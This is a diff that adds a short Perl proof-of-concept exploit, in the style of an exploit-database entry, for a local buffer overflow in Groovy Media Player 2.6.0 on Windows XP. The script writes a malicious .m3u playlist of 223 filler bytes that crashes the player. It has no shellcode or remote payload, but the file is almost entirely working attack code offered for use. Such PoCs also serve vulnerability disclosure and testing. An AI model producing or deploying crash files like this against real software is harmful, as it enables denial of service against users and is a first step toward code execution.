@@ -1,0 +1,20 @@
+#!/usr/bin/perl
+#####################################################################################
+# Exploit Title: Groovy Media Player Version 2.6.0 (.m3u) Local Buffer Overflow PoC
+# Date: 26/08/2011
+# Author: D3r K0n!G
+# Software Link: http://www.bestwebsharing.com/groovy-media-player                  
+# Category: Local Buffer Overflow PoC
+# Version: 2.6.0
+# Tested on: Windows XP SP3
+# CVE: N/A
+#####################################################################################
+#####################################################################################
+#!/bin/usr/ZL4b!4
+#####################################################################################
+my $file = "groovymp.m3u";
+my $junk = "\x41" x 223;
+open($FILE,">$file");
+print $FILE $junk;
+print "\nCrash.m3u file created successfully\n";
+close($FILE);
